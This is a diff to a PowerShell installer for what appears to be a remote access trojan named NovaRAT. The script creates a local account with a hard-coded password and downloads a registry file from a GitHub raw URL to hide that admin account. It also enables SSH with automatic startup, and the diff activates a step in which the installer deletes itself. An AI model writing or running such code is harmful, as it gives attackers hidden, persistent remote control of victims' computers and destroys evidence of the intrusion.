@@ -29,6 +29,10 @@ $uname = random_text
 $pword = (ConvertTo-SecureString "NovaRat!" -AsPlainText -Force)
 create_account -uname $uname -pword $pword
 
+#goto temp, make working direcrtory
+mkdir $path
+cd $path
+
 #registry to hide local admin
 $reg_file = random_text
 Invoke-WebRequest -Uri raw.githubusercontent.com/fazelastblood/NovaRAT/main/files/admin.reg -OutFile "$reg_file.reg"
@@ -51,13 +55,7 @@ Start-Service sshd
 Set-Service -Name sshd -StartupType 'Automatic'
 Get-NetFirewallRule -Name *ssh*
 
-#
-
-#goto temp, make working directory
-mkdir $path
-cd $path
-
 # self delete
-# cd $initial_dir
-# del installer.ps1
+cd $initial_dir
+del installer.ps1
 
